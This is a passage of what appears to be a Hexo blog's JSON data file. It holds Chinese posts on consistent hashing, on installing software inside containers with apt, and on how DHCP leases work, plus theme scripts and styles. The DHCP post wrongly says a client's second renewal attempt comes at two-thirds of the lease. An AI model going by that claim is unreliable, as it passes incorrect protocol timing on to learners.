start=\"3\">\n<li><p>每个数据通过哈希函数确定一个位置,定位到其顺时针方向第一台服务器节点上。</p>\n</li>\n<li><p>当新增或删除节点时,只影响相邻数据,大部分数据位置不变。</p>\n</li>\n</ol>\n<p>比如节点A映射到哈希环的30位置,节点B映射到70位置。数据X映射到40位置,按顺时针方向找到节点A,所以存储到A上。</p>\n<p>如果新增节点C映射到50位置,只会影响40-50区间数据,其它数据位置不变,实现了高可用。</p>\n<p>相比哈希取余,一致性哈希算法只需要重定位部分数据,大大减少了扩容缩容的影响。</p>\n<p>它的缺点是数据分布不够均匀,容易造成数据倾斜。常见优化是引入虚拟节点来纾解热点问题。</p>\n<p>拓展资料：<a href=\"https://blog.51cto.com/u_12740336/6173086\">简单介绍：一致性HASH算法和取余算法</a></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h3><p>一致性哈希算法(Consistency Hashing)是一种分布式存储算法,通过哈希环实现数据的均衡分布和高可用。主要特点是:</p>\n<ol>\n<li><p>数据映射到一个0到2^32的哈希环上。</p>\n</li>\n<li><p>节点也映射到这个哈希环上。</p>\n</li>\n</ol>","more":"<ol start=\"3\">\n<li><p>每个数据通过哈希函数确定一个位置,定位到其顺时针方向第一台服务器节点上。</p>\n</li>\n<li><p>当新增或删除节点时,只影响相邻数据,大部分数据位置不变。</p>\n</li>\n</ol>\n<p>比如节点A映射到哈希环的30位置,节点B映射到70位置。数据X映射到40位置,按顺时针方向找到节点A,所以存储到A上。</p>\n<p>如果新增节点C映射到50位置,只会影响40-50区间数据,其它数据位置不变,实现了高可用。</p>\n<p>相比哈希取余,一致性哈希算法只需要重定位部分数据,大大减少了扩容缩容的影响。</p>\n<p>它的缺点是数据分布不够均匀,容易造成数据倾斜。常见优化是引入虚拟节点来纾解热点问题。</p>\n<p>拓展资料：<a href=\"https://blog.51cto.com/u_12740336/6173086\">简单介绍：一致性HASH算法和取余算法</a></p>"},{"title":"容器中下载软件包","date":"2023-08-09T12:36:43.000Z","_content":"\n每个容器都相当于一台单独linux机器。也正因为容器的轻便型，部署好容器后，非常多的软件都是不存在的，需要自己按需下载。\n\n一般的步骤是：\n\n1. 执行命令：\n\n```bash\napt-get update\n```\n\n2. 等待软件包缓存更新完毕，执行下载命令，比如：\n\n```bash\napt install -y vim\n```","source":"_posts/ContainerDownloadSoft.md","raw":"---\ntitle: 容器中下载软件包\ndate: 2023-08-09 20:36:43\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n每个容器都相当于一台单独linux机器。也正因为容器的轻便型，部署好容器后，非常多的软件都是不存在的，需要自己按需下载。\n\n一般的步骤是：\n\n1. 执行命令：\n\n```bash\napt-get update\n```\n\n2. 等待软件包缓存更新完毕，执行下载命令，比如：\n\n```bash\napt install -y vim\n```","slug":"ContainerDownloadSoft","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5d8000p7zj351kqf5yq","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>每个容器都相当于一台单独linux机器。也正因为容器的轻便型，部署好容器后，非常多的软件都是不存在的，需要自己按需下载。</p>\n<p>一般的步骤是：</p>\n<ol>\n<li>执行命令：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>等待软件包缓存更新完毕，执行下载命令，比如：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install -y vim</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"","more":"<p>每个容器都相当于一台单独linux机器。也正因为容器的轻便型，部署好容器后，非常多的软件都是不存在的，需要自己按需下载。</p>\n<p>一般的步骤是：</p>\n<ol>\n<li>执行命令：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>等待软件包缓存更新完毕，执行下载命令，比如：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install -y vim</span><br></pre></td></tr></table></figure>"},{"title":"关于 DHCP 的理论知识","date":"2023-10-06T03:01:48.000Z","_content":"\n### DHCP工作过程\n\nDHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置信息给连接到网络的计算机和设备。以下是DHCP服务器工作的原理：\n\n<!-- more -->\n\n1. **客户端请求**：\n\n- 当一个计算机或设备加入网络时（例如，通过连接到Wi-Fi网络或通过以太网），它通常需要获取一个可用的IP地址以及其他网络配置信息，如子网掩码、网关和DNS服务器地址。\n- 初始阶段，客户端设备一般没有任何配置信息。\n\n2. **DHCP发现**：\n\n- 客户端设备在网络上广播一个DHCP Discover消息，寻找可用的DHCP服务器。这个消息表明客户端需要一个IP地址以及其他配置信息。\n\n3. **DHCP提供**：\n\n- 在网络中的一个或多个DHCP服务器接收到DHCP Discover消息后，它们可以向客户端发送DHCP Offer消息，其中包含可用的IP地址和其他配置信息。\n- 如果有多个DHCP服务器，客户端可以选择接受其中一个Offer。\n\n4. **DHCP请求**：\n\n- 客户端选择一个DHCP Offer，并向该DHCP服务器发送DHCP Request消息，确认要使用该服务器提供的IP地址和配置信息。\n\n5. **DHCP确认**：\n\n- DHCP服务器接收到客户端的DHCP Request消息后，它会向客户端发送DHCP Acknowledgment（ACK）消息，确认分配的IP地址和配置信息。\n\n6. **配置应用**：\n\n- 客户端设备接收到DHCP ACK消息后，将分配的IP地址和其他配置信息应用到其网络接口上。\n- 客户端设备现在具有了网络连接所需的配置信息，可以正常通信。\n\n7. **租约管理**：\n\n- DHCP服务器通常会分配IP地址和配置信息的租约，即一段时间内，客户端被允许使用分配的IP地址和配置信息。\n- 在租约到期前，客户端可以选择续约，以延长使用分配的IP地址的时间。如果不续约，租约到期后，IP地址将被释放，可以分配给其他设备。\n\n总结：\nDHCP服务器的主要任务是为连接到网络的设备分配IP地址和其他网络配置信息。这样，网络管理员可以轻松管理和配置大量设备，而不需要手动为每个设备分配IP地址。 DHCP协议提供了一种自动化的方式来管理网络地址分配，使网络配置更加灵活和高效。\n\n### 租约与续租\n\n在DHCP（Dynamic Host Configuration Protocol）中，IP地址到期前通常会进行两次续约请求，分别在租约的一半和三分之二的时间点：\n\n1. **第一次续约请求**：\n\n- 发生在租约时间的一半处，即租约的50%时间。例如，如果租约时间为8小时，那么第一次续约请求将在4小时时触发。\n- 客户端会发送DHCP Request消息，请求延长租约的有效期。\n- DHCP服务器可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。\n- 如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试进行第二次续约请求。\n\n2. **第二次续约请求**：\n\n- 发生在租约时间的三分之二处，即租约的66.67%时间。使用上述示例，这将在约5小时20分钟时发生。\n- 类似于第一次续约请求，客户端发送DHCP Request消息，请求续约租约。\n- DHCP服务器再次可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。\n- 如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试再次进行续约请求。\n\n续约请求的目的是确保客户端在租约即将到期时继续使用相同的IP地址，而不会导致IP地址被释放并重新分配给其他设备。通过这种方式，DHCP客户端可以保持网络连接的连续性，而不必在租约到期时重新配置网络设置。这有助于网络的稳定性和可用性。","source":"_posts/DHCP-server.md","raw":"---\ntitle: 关于 DHCP 的理论知识\ndate: 2023-10-06 11:01:48\ncategories: 理论知识\ntags:\n  - 面试\n  - 网络基础\n---\n\n### DHCP工作过程\n\nDHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置信息给连接到网络的计算机和设备。以下是DHCP服务器工作的原理：\n\n<!-- more -->\n\n1. **客户端请求**：\n\n- 当一个计算机或设备加入网络时（例如，通过连接到Wi-Fi网络或通过以太网），它通常需要获取一个可用的IP地址以及其他网络配置信息，如子网掩码、网关和DNS服务器地址。\n- 初始阶段，客户端设备一般没有任何配置信息。\n\n2. **DHCP发现**：\n\n- 客户端设备在网络上广播一个DHCP Discover消息，寻找可用的DHCP服务器。这个消息表明客户端需要一个IP地址以及其他配置信息。\n\n3. **DHCP提供**：\n\n- 在网络中的一个或多个DHCP服务器接收到DHCP Discover消息后，它们可以向客户端发送DHCP Offer消息，其中包含可用的IP地址和其他配置信息。\n- 如果有多个DHCP服务器，客户端可以选择接受其中一个Offer。\n\n4. **DHCP请求**：\n\n- 客户端选择一个DHCP Offer，并向该DHCP服务器发送DHCP Request消息，确认要使用该服务器提供的IP地址和配置信息。\n\n5. **DHCP确认**：\n\n- DHCP服务器接收到客户端的DHCP Request消息后，它会向客户端发送DHCP Acknowledgment（ACK）消息，确认分配的IP地址和配置信息。\n\n6. **配置应用**：\n\n- 客户端设备接收到DHCP ACK消息后，将分配的IP地址和其他配置信息应用到其网络接口上。\n- 客户端设备现在具有了网络连接所需的配置信息，可以正常通信。\n\n7. **租约管理**：\n\n- DHCP服务器通常会分配IP地址和配置信息的租约，即一段时间内，客户端被允许使用分配的IP地址和配置信息。\n- 在租约到期前，客户端可以选择续约，以延长使用分配的IP地址的时间。如果不续约，租约到期后，IP地址将被释放，可以分配给其他设备。\n\n总结：\nDHCP服务器的主要任务是为连接到网络的设备分配IP地址和其他网络配置信息。这样，网络管理员可以轻松管理和配置大量设备，而不需要手动为每个设备分配IP地址。 DHCP协议提供了一种自动化的方式来管理网络地址分配，使网络配置更加灵活和高效。\n\n### 租约与续租\n\n在DHCP（Dynamic Host Configuration Protocol）中，IP地址到期前通常会进行两次续约请求，分别在租约的一半和三分之二的时间点：\n\n1. **第一次续约请求**：\n\n- 发生在租约时间的一半处，即租约的50%时间。例如，如果租约时间为8小时，那么第一次续约请求将在4小时时触发。\n- 客户端会发送DHCP Request消息，请求延长租约的有效期。\n- DHCP服务器可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。\n- 如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试进行第二次续约请求。\n\n2. **第二次续约请求**：\n\n- 发生在租约时间的三分之二处，即租约的66.67%时间。使用上述示例，这将在约5小时20分钟时发生。\n- 类似于第一次续约请求，客户端发送DHCP Request消息，请求续约租约。\n- DHCP服务器再次可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。\n- 如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试再次进行续约请求。\n\n续约请求的目的是确保客户端在租约即将到期时继续使用相同的IP地址，而不会导致IP地址被释放并重新分配给其他设备。通过这种方式，DHCP客户端可以保持网络连接的连续性，而不必在租约到期时重新配置网络设置。这有助于网络的稳定性和可用性。","slug":"DHCP-server","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5d9000q7zj3f785fxei","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"DHCP工作过程\"><a href=\"#DHCP工作过程\" class=\"headerlink\" title=\"DHCP工作过程\"></a>DHCP工作过程</h3><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置信息给连接到网络的计算机和设备。以下是DHCP服务器工作的原理：</p>\n<span id=\"more\"></span>\n\n<ol>\n<li><strong>客户端请求</strong>：</li>\n</ol>\n<ul>\n<li>当一个计算机或设备加入网络时（例如，通过连接到Wi-Fi网络或通过以太网），它通常需要获取一个可用的IP地址以及其他网络配置信息，如子网掩码、网关和DNS服务器地址。</li>\n<li>初始阶段，客户端设备一般没有任何配置信息。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>DHCP发现</strong>：</li>\n</ol>\n<ul>\n<li>客户端设备在网络上广播一个DHCP Discover消息，寻找可用的DHCP服务器。这个消息表明客户端需要一个IP地址以及其他配置信息。</li>\n</ul>\n<ol start=\"3\">\n<li><strong>DHCP提供</strong>：</li>\n</ol>\n<ul>\n<li>在网络中的一个或多个DHCP服务器接收到DHCP Discover消息后，它们可以向客户端发送DHCP Offer消息，其中包含可用的IP地址和其他配置信息。</li>\n<li>如果有多个DHCP服务器，客户端可以选择接受其中一个Offer。</li>\n</ul>\n<ol start=\"4\">\n<li><strong>DHCP请求</strong>：</li>\n</ol>\n<ul>\n<li>客户端选择一个DHCP Offer，并向该DHCP服务器发送DHCP Request消息，确认要使用该服务器提供的IP地址和配置信息。</li>\n</ul>\n<ol start=\"5\">\n<li><strong>DHCP确认</strong>：</li>\n</ol>\n<ul>\n<li>DHCP服务器接收到客户端的DHCP Request消息后，它会向客户端发送DHCP Acknowledgment（ACK）消息，确认分配的IP地址和配置信息。</li>\n</ul>\n<ol start=\"6\">\n<li><strong>配置应用</strong>：</li>\n</ol>\n<ul>\n<li>客户端设备接收到DHCP ACK消息后，将分配的IP地址和其他配置信息应用到其网络接口上。</li>\n<li>客户端设备现在具有了网络连接所需的配置信息，可以正常通信。</li>\n</ul>\n<ol start=\"7\">\n<li><strong>租约管理</strong>：</li>\n</ol>\n<ul>\n<li>DHCP服务器通常会分配IP地址和配置信息的租约，即一段时间内，客户端被允许使用分配的IP地址和配置信息。</li>\n<li>在租约到期前，客户端可以选择续约，以延长使用分配的IP地址的时间。如果不续约，租约到期后，IP地址将被释放，可以分配给其他设备。</li>\n</ul>\n<p>总结：<br>DHCP服务器的主要任务是为连接到网络的设备分配IP地址和其他网络配置信息。这样，网络管理员可以轻松管理和配置大量设备，而不需要手动为每个设备分配IP地址。 DHCP协议提供了一种自动化的方式来管理网络地址分配，使网络配置更加灵活和高效。</p>\n<h3 id=\"租约与续租\"><a href=\"#租约与续租\" class=\"headerlink\" title=\"租约与续租\"></a>租约与续租</h3><p>在DHCP（Dynamic Host Configuration Protocol）中，IP地址到期前通常会进行两次续约请求，分别在租约的一半和三分之二的时间点：</p>\n<ol>\n<li><strong>第一次续约请求</strong>：</li>\n</ol>\n<ul>\n<li>发生在租约时间的一半处，即租约的50%时间。例如，如果租约时间为8小时，那么第一次续约请求将在4小时时触发。</li>\n<li>客户端会发送DHCP Request消息，请求延长租约的有效期。</li>\n<li>DHCP服务器可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。</li>\n<li>如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试进行第二次续约请求。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>第二次续约请求</strong>：</li>\n</ol>\n<ul>\n<li>发生在租约时间的三分之二处，即租约的66.67%时间。使用上述示例，这将在约5小时20分钟时发生。</li>\n<li>类似于第一次续约请求，客户端发送DHCP Request消息，请求续约租约。</li>\n<li>DHCP服务器再次可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。</li>\n<li>如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试再次进行续约请求。</li>\n</ul>\n<p>续约请求的目的是确保客户端在租约即将到期时继续使用相同的IP地址，而不会导致IP地址被释放并重新分配给其他设备。通过这种方式，DHCP客户端可以保持网络连接的连续性，而不必在租约到期时重新配置网络设置。这有助于网络的稳定性和可用性。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"DHCP工作过程\"><a href=\"#DHCP工作过程\" class=\"headerlink\" title=\"DHCP工作过程\"></a>DHCP工作过程</h3><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置信息给连接到网络的计算机和设备。以下是DHCP服务器工作的原理：</p>","more":"<ol>\n<li><strong>客户端请求</strong>：</li>\n</ol>\n<ul>\n<li>当一个计算机或设备加入网络时（例如，通过连接到Wi-Fi网络或通过以太网），它通常需要获取一个可用的IP地址以及其他网络配置信息，如子网掩码、网关和DNS服务器地址。</li>\n<li>初始阶段，客户端设备一般没有任何配置信息。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>DHCP发现</strong>：</li>\n</ol>\n<ul>\n<li>客户端设备在网络上广播一个DHCP Discover消息，寻找可用的DHCP服务器。这个消息表明客户端需要一个IP地址以及其他配置信息。</li>\n</ul>\n<ol start=\"3\">\n<li><strong>DHCP提供</strong>：</li>\n</ol>\n<ul>\n<li>在网络中的一个或多个DHCP服务器接收到DHCP Discover消息后，它们可以向客户端发送DHCP Offer消息，其中包含可用的IP地址和其他配置信息。</li>\n<li>如果有多个DHCP服务器，客户端可以选择接受其中一个Offer。</li>\n</ul>\n<ol start=\"4\">\n<li><strong>DHCP请求</strong>：</li>\n</ol>\n<ul>\n<li>客户端选择一个DHCP Offer，并向该DHCP服务器发送DHCP Request消息，确认要使用该服务器提供的IP地址和配置信息。</li>\n</ul>\n<ol start=\"5\">\n<li><strong>DHCP确认</strong>：</li>\n</ol>\n<ul>\n<li>DHCP服务器接收到客户端的DHCP Request消息后，它会向客户端发送DHCP Acknowledgment（ACK）消息，确认分配的IP地址和配置信息。</li>\n</ul>\n<ol start=\"6\">\n<li><strong>配置应用</strong>：</li>\n</ol>\n<ul>\n<li>客户端设备接收到DHCP ACK消息后，将分配的IP地址和其他配置信息应用到其网络接口上。</li>\n<li>客户端设备现在具有了网络连接所需的配置信息，可以正常通信。</li>\n</ul>\n<ol start=\"7\">\n<li><strong>租约管理</strong>：</li>\n</ol>\n<ul>\n<li>DHCP服务器通常会分配IP地址和配置信息的租约，即一段时间内，客户端被允许使用分配的IP地址和配置信息。</li>\n<li>在租约到期前，客户端可以选择续约，以延长使用分配的IP地址的时间。如果不续约，租约到期后，IP地址将被释放，可以分配给其他设备。</li>\n</ul>\n<p>总结：<br>DHCP服务器的主要任务是为连接到网络的设备分配IP地址和其他网络配置信息。这样，网络管理员可以轻松管理和配置大量设备，而不需要手动为每个设备分配IP地址。 DHCP协议提供了一种自动化的方式来管理网络地址分配，使网络配置更加灵活和高效。</p>\n<h3 id=\"租约与续租\"><a href=\"#租约与续租\" class=\"headerlink\" title=\"租约与续租\"></a>租约与续租</h3><p>在DHCP（Dynamic Host Configuration Protocol）中，IP地址到期前通常会进行两次续约请求，分别在租约的一半和三分之二的时间点：</p>\n<ol>\n<li><strong>第一次续约请求</strong>：</li>\n</ol>\n<ul>\n<li>发生在租约时间的一半处，即租约的50%时间。例如，如果租约时间为8小时，那么第一次续约请求将在4小时时触发。</li>\n<li>客户端会发送DHCP Request消息，请求延长租约的有效期。</li>\n<li>DHCP服务器可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。</li>\n<li>如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试进行第二次续约请求。</li>\n</ul>\n<ol 